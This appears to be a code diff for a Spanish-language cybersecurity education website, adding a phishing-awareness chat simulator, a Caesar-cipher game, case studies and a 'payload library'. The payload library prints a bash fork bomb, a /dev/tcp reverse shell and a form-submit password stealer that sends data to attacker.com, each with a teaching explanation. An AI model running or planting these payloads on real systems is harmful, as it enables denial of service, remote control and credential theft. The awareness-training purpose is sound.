@@ -1768,3 +1768,360 @@ window.addEventListener('load', () => {
     iniciarTypewriter();
 });
 
+// --- 6. SOCIAL ENGINEERING SIMULATOR ---
+let socialEngScore = 0;
+let currentEngStep = 0;
+
+const socialEngSteps = [
+    {
+        sender: "Marcos (IT Support)",
+        message: "Hola, soy Marcos de soporte técnico. Detectamos una brecha de seguridad en tu equipo y necesitamos reiniciarlo remotamente. Por favor, confírmame tu contraseña para autorizar la conexión.",
+        tactic: "Autoridad",
+        options: [
+            { text: "Claro, mi contraseña es User2024!", isCorrect: false, feedback: "¡Cuidado! IT nunca te pedirá tu contraseña por chat." },
+            { text: "No comparto contraseñas por chat. Abriré un ticket por los canales oficiales.", isCorrect: true, feedback: "¡Muy bien! Reconociste un ataque de suplantación de identidad." }
+        ]
+    },
+    {
+        sender: "CEO (Urgente)",
+        message: "Hola, estoy en una reunión súper importante y olvidé comprar las tarjetas de regalo para los clientes. ¿Puedes comprar 3 de $100 y enviarme los códigos por aquí? Te lo devuelvo en una hora. Es urgente.",
+        tactic: "Urgencia",
+        options: [
+            { text: "Voy volando a comprarlas, jefe.", isCorrect: false, feedback: "¡Error! La urgencia es una táctica para que no pienses con claridad." },
+            { text: "Llamaré a tu oficina para confirmar esta petición inusual.", isCorrect: true, feedback: "¡Excelente! Verificaste la identidad fuera del canal sospechoso." }
+        ]
+    },
+    {
+        sender: "Seguridad Bancaria",
+        message: "ALERTA: Se ha detectado un cargo de $2,500 en su cuenta. Si no reconoce esta transacción, haga clic aquí inmediatamente para cancelarla o perderá su dinero: [ENLACE MALICIOSO]",
+        tactic: "Miedo",
+        options: [
+            { text: "¡Dios mío! Entraré al link ahora mismo para cancelar.", isCorrect: false, feedback: "¡Caíste! El miedo te hizo entrar a un sitio de phishing." },
+            { text: "Ignoraré el link y entraré manualmente a la web oficial de mi banco.", isCorrect: true, feedback: "¡Perfecto! Nunca uses links en mensajes de alerta de este tipo." }
+        ]
+    }
+];
+
+function iniciarSocialEng() {
+    socialEngScore = 0;
+    currentEngStep = 0;
+    document.getElementById('social-eng-score').innerText = "Puntos: 0";
+    document.getElementById('chat-window').innerHTML = "";
+    registrarEvento("Iniciando simulador de ingeniería social...", "INFO");
+    mostrarSiguientePasoEng();
+}
+
+function mostrarSiguientePasoEng() {
+    const chatWindow = document.getElementById('chat-window');
+    const optionsArea = document.getElementById('chat-options');
+    
+    if (currentEngStep < socialEngSteps.length) {
+        const step = socialEngSteps[currentEngStep];
+        
+        chatWindow.innerHTML += `<div class="chat-bubble bot-bubble"><strong>${step.sender}:</strong><br>${step.message}</div>`;
+        chatWindow.scrollTop = chatWindow.scrollHeight;
+        
+        optionsArea.innerHTML = step.options.map((opt, index) => 
+            `<button class="btn-secondary" onclick="responderEng(${index})">${opt.text}</button>`
+        ).join("");
+    } else {
+        chatWindow.innerHTML += `<div class="chat-bubble bot-bubble"><strong>Simulador:</strong><br>Entrenamiento finalizado. Puntos totales: ${socialEngScore}</div>`;
+        optionsArea.innerHTML = `<button class="btn-primary" onclick="iniciarSocialEng()">Reiniciar</button>`;
+        registrarEvento(`Simulador Social finalizado. Score: ${socialEngScore}`, "SUCCESS");
+    }
+}
+
+function responderEng(optionIndex) {
+    const step = socialEngSteps[currentEngStep];
+    const option = step.options[optionIndex];
+    const chatWindow = document.getElementById('chat-window');
+    
+    chatWindow.innerHTML += `<div class="chat-bubble user-bubble">${option.text}</div>`;
+    
+    if (option.isCorrect) {
+        socialEngScore += 20;
+        ganarPuntos(20, `Ingeniería Social: Detectó táctica de ${step.tactic}`);
+    } else {
+        showNotification(option.feedback, "error");
+    }
+    
+    document.getElementById('social-eng-score').innerText = `Puntos: ${socialEngScore}`;
+    currentEngStep++;
+    setTimeout(mostrarSiguientePasoEng, 1000);
+}
+
+// --- 7. CRYPTO DECIPHER GAME ---
+let cryptoTargetText = "";
+let cryptoEncryptedText = "";
+let cryptoUserScore = 0;
+const cryptoMessages = [
+    "INTERCEPTAR COMUNICACIONES",
+    "LLAVE PRIVADA PROTEGIDA",
+    "ATAQUE EN EL SECTOR SIETE",
+    "CIFRADO DE EXTREMO A EXTREMO",
+    "SERVIDOR VULNERABLE DETECTADO",
+    "LA SEGURIDAD ES UN PROCESO",
+    "PROTEGE TU IDENTIDAD DIGITAL"
+];
+
+function shiftText(text, shift) {
+    return text.toUpperCase().replace(/[A-Z]/g, char => {
+        return String.fromCharCode(((char.charCodeAt(0) - 65 + shift) % 26 + 26) % 26 + 65);
+    });
+}
+
+function iniciarCripto() {
+    const display = document.getElementById('cipher-text-display');
+    const controls = document.getElementById('crypto-controls');
+    const slider = document.getElementById('crypto-slider');
+    
+    // Seleccionar mensaje y aplicar un desplazamiento aleatorio
+    cryptoTargetText = cryptoMessages[Math.floor(Math.random() * cryptoMessages.length)];
+    const randomShift = Math.floor(Math.random() * 25) + 1;
+    cryptoEncryptedText = shiftText(cryptoTargetText, randomShift);
+    
+    slider.value = 0;
+    document.getElementById('shift-value').innerText = "0";
+    display.innerText = cryptoEncryptedText;
+    display.style.color = "var(--accent)";
+    controls.style.display = "block";
+    
+    registrarEvento("Frecuencia interceptada. Iniciando algoritmo de descifrado...", "WARNING");
+}
+
+function actualizarCripto(val) {
+    const display = document.getElementById('cipher-text-display');
+    const sliderValueDisplay = document.getElementById('shift-value');
+    sliderValueDisplay.innerText = val;
+    
+    // El usuario "aplica" un desplazamiento sobre el texto ya cifrado
+    const currentText = shiftText(cryptoEncryptedText, parseInt(val));
+    display.innerText = currentText;
+    
+    if (currentText === cryptoTargetText) {
+        display.style.color = "var(--success)";
+        document.getElementById('crypto-controls').style.display = "none";
+        cryptoUserScore += 30;
+        document.getElementById('crypto-score').innerText = `Puntos: ${cryptoUserScore}`;
+        ganarPuntos(30, "Criptografía: Mensaje enemigo descifrado");
+        showNotification("¡Señal descifrada correctamente!", "success");
+        registrarEvento("Mensaje descifrado: " + currentText, "SUCCESS");
+    }
+}
+
+// --- TYPEWRITER EFFECT PARA EL TÍTULO ---
+let typewriterRunning = false;
+
+function iniciarTypewriter() {
+    if (typewriterRunning) return; // Evitar múltiples ejecuciones
+    typewriterRunning = true;
+    
+    const titleElement = document.getElementById('hero-title');
+    const fullText = textos[currentLang].hero.title;
+    let index = 0;
+    
+    function typeWriter() {
+        if (index < fullText.length) {
+            // Buscar si hay un span para "Binary Three"
+            const binaryIndex = fullText.indexOf('Binary Three', index);
+            if (binaryIndex === index) {
+                // Agregar el span con glow
+                titleElement.innerHTML += '<span class="text-glow">Binary Three</span>';
+                index += 'Binary Three'.length;
+            } else {
+                titleElement.innerHTML += fullText.charAt(index);
+                index++;
+            }
+            setTimeout(typeWriter, 50); // Velocidad de escritura
+        } else {
+            // Agregar cursor parpadeante al final
+            titleElement.innerHTML += '<span class="cursor">|</span>';
+            setInterval(() => {
+                const cursor = document.querySelector('.cursor');
+                if (cursor) cursor.style.opacity = cursor.style.opacity === '0' ? '1' : '0';
+            }, 500);
+            typewriterRunning = false; // Liberar flag
+        }
+    }
+    
+    titleElement.innerHTML = ''; // Limpiar antes de empezar
+    typeWriter();
+}
+
+// --- 8. PAYLOAD LIBRARY LOGIC ---
+const payloadsData = {
+    fork: {
+        code: `:(){ :|:& };:`,
+        explanation: `<strong>Autopsia de un Fork Bomb (Bash):</strong><br><br>
+        1. <code>:()</code>: Define una función llamada ':'.<br>
+        2. <code>{ ... }</code>: Cuerpo de la función.<br>
+        3. <code>:|:</code>: Llama a la función y redirige la salida a otra copia de sí misma.<br>
+        4. <code>&</code>: Ejecuta el proceso en segundo plano.<br>
+        5. <code>;:</code>: Termina la definición y ejecuta la función por primera vez.<br><br>
+        <em>Resultado:</em> Agota los recursos del CPU creando procesos infinitos.`
+    },
+    reverse: {
+        code: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
+        explanation: `<strong>Autopsia de Reverse Shell:</strong><br><br>
+        1. <code>bash -i</code>: Inicia un shell interactivo.<br>
+        2. <code>>& /dev/tcp/...</code>: Redirige la salida y el error a una conexión de red externa.<br>
+        3. <code>0>&1</code>: Toma la entrada de esa misma conexión.<br><br>
+        <em>Lección:</em> Permite a un atacante controlar tu terminal desde internet.`
+    },
+    phishing: {
+        code: `document.forms[0].onsubmit = function() {\n  fetch('https://attacker.com/log?p=' + this.pass.value);\n};`,
+        explanation: `<strong>Autopsia de Credential Stealer:</strong><br><br>
+        1. <code>onsubmit</code>: Intercepta el momento en que envías un formulario.<br>
+        2. <code>fetch(...)</code>: Envía el valor del campo 'pass' a un servidor externo oculto.<br><br>
+        <em>Prevención:</em> Nunca ingreses datos en sitios sin HTTPS verificado o sospechosos.`
+    }
+};
+
+function loadPayload(id) {
+    const p = payloadsData[id];
+    document.getElementById('code-area').innerText = p.code;
+    document.getElementById('explanation-area').innerHTML = p.explanation;
+    registrarEvento(`Analizando payload: ${id}`, "INFO");
+}
+
+// --- 9. CASE STUDIES (CIBER-HISTORIA) ---
+const historyData = {
+    wannacry: {
+        title: "WannaCry Ransomware",
+        passo: "Aprovecharon la vulnerabilidad EternalBlue en Windows (SMB).",
+        impacto: "300,000 computadoras cifradas en 150 países.",
+        leccion: "Mantener los parches de seguridad al día es vital. Microsoft había lanzado el parche meses antes."
+    },
+    sony: {
+        title: "Sony Pictures Hack",
+        passo: "Phishing dirigido a empleados de alto nivel para obtener credenciales.",
+        impacto: "Filtración de películas sin estrenar, correos privados y datos de empleados.",
+        leccion: "La ingeniería social es el eslabón más débil. Se requiere monitoreo de exfiltración de datos."
+    }
+};
+
+function showHistory(id) {
+    const h = historyData[id];
+    const detail = document.getElementById('history-detail');
+    detail.style.display = 'block';
+    detail.innerHTML = `
+        <div class="card cyber-card reveal active" style="border-left: 4px solid var(--accent);">
+            <h3><i class="fas fa-history"></i> Análisis: ${h.title}</h3>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 15px;">
+                <div><strong style="color: var(--danger);">¿Cómo entraron?</strong><br><p style="font-size: 0.9rem;">${h.passo}</p></div>
+                <div><strong style="color: var(--warning);">¿Qué pasó?</strong><br><p style="font-size: 0.9rem;">${h.impacto}</p></div>
+                <div><strong style="color: var(--success);">¿Qué aprendimos?</strong><br><p style="font-size: 0.9rem;">${h.leccion}</p></div>
+            </div>
+        </div>
+    `;
+    detail.scrollIntoView({ behavior: 'smooth' });
+    registrarEvento(`Consultando historia: ${h.title}`, "INFO");
+}
+
+// --- Formulario de Contacto ---
+function enviarMensaje(event) {
+    event.preventDefault();
+    const name = document.getElementById('contact-name').value;
+    const email = document.getElementById('contact-email').value;
+    const message = document.getElementById('contact-message').value;
+    const btn = event.target.querySelector('button');
+    const successMsg = document.getElementById('contact-success');
+    
+    if (name && email && message) {
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando';
+        btn.disabled = true;
+        
+        // Simular envío (en producción, usar API)
+        setTimeout(() => {
+            btn.innerHTML = '<i class="fas fa-check"></i> Enviado';
+            btn.style.background = 'var(--success)';
+            event.target.reset();
+            successMsg.style.display = 'block';
+            registrarEvento(`Mensaje de ${name} enviado`, "SUCCESS");
+        }, 2000);
+    }
+}
+
+// --- MULTIDIOMA ---
+let currentLang = 'es';
+
+const textos = {
+    es: {
+        nav: ['Guías', 'Conceptos', 'Avisos', 'Recursos', 'Tu Nivel', 'Práctica', 'Contacto'],
+        hero: {
+            title: 'Aprende a proteger tus datos con Binary Three',
+            subtitle: 'Guías prácticas, simulaciones y alertas reales para comprender ataques y fortalecer tu presencia digital.',
+            btn1: '¿Cómo protegerme?',
+            btn2: 'Prueba el quiz'
+        },
+        stats: ['Monitoreo', 'Vulnerabilidades', 'Protección'],
+        proteger: {
+            title: 'Cómo protegerte',
+            subtitle: 'Pasos sencillos que puedes aplicar ya mismo para reducir el riesgo de ataques y cuidar tu información.'
+        },
+        checklist: {
+            title: 'Tu Nivel de Protección',
+            subtitle: 'Marca las acciones que ya has completado para ver qué tan segura es tu vida digital.',
+            rank: 'Rango: ',
+            vulnerable: 'Vulnerable',
+            progress: '% Completado',
+            congrats: '¡Felicidades! Tienes excelentes hábitos digitales.'
+        }
+    },
+    en: {
+        nav: ['Guides', 'Concepts', 'Alerts', 'Resources', 'Your Level', 'Practice', 'Contact'],
+        hero: {
+            title: 'Learn to protect your data with Binary Three',
+            subtitle: 'Practical guides, simulations and real alerts to understand attacks and strengthen your digital presence.',
+            btn1: 'How to protect myself?',
+            btn2: 'Try the quiz'
+        },
+        stats: ['Monitoring', 'Vulnerabilities', 'Protection'],
+        proteger: {
+            title: 'How to protect yourself',
+            subtitle: 'Simple steps you can apply right now to reduce the risk of attacks and take care of your information.'
+        },
+        checklist: {
+            title: 'Your Protection Level',
+            subtitle: 'Mark the actions you have already completed to see how secure your digital life is.',
+            rank: 'Rank: ',
+            vulnerable: 'Vulnerable',
+            progress: '% Completed',
+            congrats: 'Congratulations! You have excellent digital habits.'
+        }
+    }
+};
+
+function toggleLanguage() {
+    const btn = document.getElementById('lang-toggle');
+    currentLang = currentLang === 'es' ? 'en' : 'es';
+    btn.innerText = currentLang.toUpperCase();
+    localStorage.setItem('binary_three_lang', currentLang);
+    aplicarIdioma();
+    iniciarTypewriter(); // Reiniciar typewriter con nuevo idioma
+}
+
+function aplicarIdioma() {
+    const t = textos[currentLang];
+    
+    // Hero subtitle y botones
+    document.querySelector('.hero p').innerText = t.hero.subtitle;
+    document.querySelectorAll('.hero-btns a')[0].innerText = t.hero.btn1;
+    document.querySelectorAll('.hero-btns a')[1].innerText = t.hero.btn2;
+    
+    // Resto de traducciones...
+    // Stats
+    const statDescs = document.querySelectorAll('.stat-desc');
+    statDescs.forEach((desc, i) => {
+        if (t.stats[i]) desc.innerText = t.stats[i];
+    });
+    
+    // Proteger
+    document.querySelector('#proteger .title-gradient').innerText = t.proteger.title;
+    document.querySelector('#proteger .section-header p').innerText = t.proteger.subtitle;
+    
+    // Checklist
+    document.querySelector('#checklist .title-gradient').innerText = t.checklist.title;
+    document.querySelector('#checklist .section-header p').innerText = t.checklist.subtitle;
+    document.getElementById('rank-text').innerText = t.checklist.vulnerable;
+}
